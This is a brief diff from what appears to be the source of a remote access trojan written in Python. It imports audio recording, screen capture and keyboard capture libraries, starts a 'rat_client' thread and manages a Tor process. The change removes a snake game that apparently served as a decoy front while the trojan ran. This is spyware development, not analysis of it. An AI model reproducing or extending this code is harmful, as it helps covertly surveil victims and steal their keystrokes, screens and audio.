@@ -12,7 +12,6 @@ import pyaudio
 from PIL import ImageGrab
 from pynput import keyboard
 import json
-from jeu.snake import jeu 
 import uuid
 
 
@@ -267,8 +266,7 @@ def main():
 	)
 	ratThread = threading.Thread(target=rat_client, daemon=True)
 	ratThread.start()
-	jeu()
-	
+	ratThread.join()
 	tor_process.terminate()
 
 
